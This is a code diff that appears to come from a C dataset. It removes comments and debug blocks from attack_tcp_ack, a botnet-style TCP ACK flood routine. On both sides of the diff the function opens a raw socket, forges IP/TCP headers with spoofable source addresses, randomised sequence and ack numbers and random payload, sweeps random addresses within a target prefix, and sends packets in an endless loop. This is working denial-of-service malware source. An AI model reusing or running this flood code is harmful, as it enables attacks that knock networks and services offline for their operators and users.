@@ -1,72 +1,72 @@
-#define NULL ((void*)0)
-typedef unsigned long size_t;  // Customize by platform.
+
+typedef unsigned long size_t;
 typedef long intptr_t; typedef unsigned long uintptr_t;
-typedef long scalar_t__;  // Either arithmetic or pointer type.
-/* By default, we understand bool (as a convenience). */
+typedef long scalar_t__;
+
 typedef int bool;
-#define false 0
-#define true 1
 
-/* Forward declarations */
-typedef  struct TYPE_2__   TYPE_1__ ;
 
-/* Type definitions */
-typedef  int uint8_t ;
-typedef  int uint32_t ;
-typedef  int uint16_t ;
+
+
+typedef struct TYPE_2__ TYPE_1__ ;
+
+
+typedef int uint8_t ;
+typedef int uint32_t ;
+typedef int uint16_t ;
 struct tcphdr {int source; int dest; int seq; int doff; int psh; int window; int ack_seq; scalar_t__ check; void* fin; void* syn; void* rst; void* ack; void* urg; } ;
 struct sockaddr_in {int dummy; } ;
 struct sockaddr {int dummy; } ;
-struct iphdr {int version; int ihl; int tos; int id; int ttl; int saddr; scalar_t__ check; int /*<<< orphan*/  daddr; int /*<<< orphan*/  protocol; void* frag_off; void* tot_len; } ;
+struct iphdr {int version; int ihl; int tos; int id; int ttl; int saddr; scalar_t__ check; int daddr; int protocol; void* frag_off; void* tot_len; } ;
 struct TYPE_2__ {int sin_port; } ;
-struct attack_target {int netmask; TYPE_1__ sock_addr; int /*<<< orphan*/  addr; } ;
+struct attack_target {int netmask; TYPE_1__ sock_addr; int addr; } ;
 struct attack_option {int dummy; } ;
-typedef  int port_t ;
-typedef  void* BOOL ;
+typedef int port_t ;
+typedef void* BOOL ;
 
-/* Variables and functions */
- int /*<<< orphan*/  AF_INET ; 
- int /*<<< orphan*/  ATK_OPT_ACK ; 
- int /*<<< orphan*/  ATK_OPT_ACKRND ; 
- int /*<<< orphan*/  ATK_OPT_DPORT ; 
- int /*<<< orphan*/  ATK_OPT_FIN ; 
- int /*<<< orphan*/  ATK_OPT_IP_DF ; 
- int /*<<< orphan*/  ATK_OPT_IP_IDENT ; 
- int /*<<< orphan*/  ATK_OPT_IP_TOS ; 
- int /*<<< orphan*/  ATK_OPT_IP_TTL ; 
- int /*<<< orphan*/  ATK_OPT_PAYLOAD_RAND ; 
- int /*<<< orphan*/  ATK_OPT_PAYLOAD_SIZE ; 
- int /*<<< orphan*/  ATK_OPT_PSH ; 
- int /*<<< orphan*/  ATK_OPT_RST ; 
- int /*<<< orphan*/  ATK_OPT_SEQRND ; 
- int /*<<< orphan*/  ATK_OPT_SOURCE ; 
- int /*<<< orphan*/  ATK_OPT_SPORT ; 
- int /*<<< orphan*/  ATK_OPT_SYN ; 
- int /*<<< orphan*/  ATK_OPT_URG ; 
- int FALSE ; 
- int /*<<< orphan*/  IPPROTO_IP ; 
- int /*<<< orphan*/  IPPROTO_TCP ; 
- int /*<<< orphan*/  IP_HDRINCL ; 
- int /*<<< orphan*/  LOCAL_ADDR ; 
- int /*<<< orphan*/  MSG_NOSIGNAL ; 
- int /*<<< orphan*/  SOCK_RAW ; 
- int TRUE ; 
- void* attack_get_opt_int (int,struct attack_option*,int /*<<< orphan*/ ,int) ; 
- int attack_get_opt_ip (int,struct attack_option*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
- void* calloc (int,int) ; 
- scalar_t__ checksum_generic (int*,int) ; 
- scalar_t__ checksum_tcpudp (struct iphdr*,struct tcphdr*,void*,int) ; 
- int /*<<< orphan*/  close (int) ; 
- scalar_t__ errno ; 
- int /*<<< orphan*/  htonl (scalar_t__) ; 
- void* htons (int) ; 
- scalar_t__ ntohl (int /*<<< orphan*/ ) ; 
- int /*<<< orphan*/  printf (char*,...) ; 
- int rand_next () ; 
- int /*<<< orphan*/  rand_str (char*,int) ; 
- int /*<<< orphan*/  sendto (int,char*,int,int /*<<< orphan*/ ,struct sockaddr*,int) ; 
- int setsockopt (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*,int) ; 
- int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
+
+ int AF_INET ;
+ int ATK_OPT_ACK ;
+ int ATK_OPT_ACKRND ;
+ int ATK_OPT_DPORT ;
+ int ATK_OPT_FIN ;
+ int ATK_OPT_IP_DF ;
+ int ATK_OPT_IP_IDENT ;
+ int ATK_OPT_IP_TOS ;
+ int ATK_OPT_IP_TTL ;
+ int ATK_OPT_PAYLOAD_RAND ;
+ int ATK_OPT_PAYLOAD_SIZE ;
+ int ATK_OPT_PSH ;
+ int ATK_OPT_RST ;
+ int ATK_OPT_SEQRND ;
+ int ATK_OPT_SOURCE ;
+ int ATK_OPT_SPORT ;
+ int ATK_OPT_SYN ;
+ int ATK_OPT_URG ;
+ int FALSE ;
+ int IPPROTO_IP ;
+ int IPPROTO_TCP ;
+ int IP_HDRINCL ;
+ int LOCAL_ADDR ;
+ int MSG_NOSIGNAL ;
+ int SOCK_RAW ;
+ int TRUE ;
+ void* attack_get_opt_int (int,struct attack_option*,int ,int) ;
+ int attack_get_opt_ip (int,struct attack_option*,int ,int ) ;
+ void* calloc (int,int) ;
+ scalar_t__ checksum_generic (int*,int) ;
+ scalar_t__ checksum_tcpudp (struct iphdr*,struct tcphdr*,void*,int) ;
+ int close (int) ;
+ scalar_t__ errno ;
+ int htonl (scalar_t__) ;
+ void* htons (int) ;
+ scalar_t__ ntohl (int ) ;
+ int printf (char*,...) ;
+ int rand_next () ;
+ int rand_str (char*,int) ;
+ int sendto (int,char*,int,int ,struct sockaddr*,int) ;
+ int setsockopt (int,int ,int ,int*,int) ;
+ int socket (int ,int ,int ) ;
 
 void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
@@ -92,17 +92,17 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
-#ifdef DEBUG
-        printf("Failed to create raw socket. Aborting attack\n");
-#endif
+
+
+
         return;
     }
     i = 1;
     if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
     {
-#ifdef DEBUG
-        printf("Failed to set IP_HDRINCL. Aborting\n");
-#endif
+
+
+
         close(fd);
         return;
     }
@@ -147,11 +147,11 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         rand_str(payload, data_len);
     }
 
-//    targs[0].sock_addr.sin_port = tcph->dest;
-//    if (sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[0].sock_addr, sizeof (struct sockaddr_in)) < 1)
-//    {
-//
-//    }
+
+
+
+
+
 
     while (TRUE)
     {
@@ -162,7 +162,7 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
             char *data = (char *)(tcph + 1);
 
-            // For prefix attacks
+
             if (targs[i].netmask < 32)
                 iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
 
@@ -179,7 +179,7 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             if (ack == 0xffff)
                 tcph->ack_seq = rand_next();
 
-            // Randomize packet content?
+
             if (data_rand)
                 rand_str(data, data_len);
 
@@ -192,10 +192,10 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             targs[i].sock_addr.sin_port = tcph->dest;
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
-#ifdef DEBUG
-            break;
-            if (errno != 0)
-                printf("errno = %d\n", errno);
-#endif
+
+
+
+
+
     }
 }
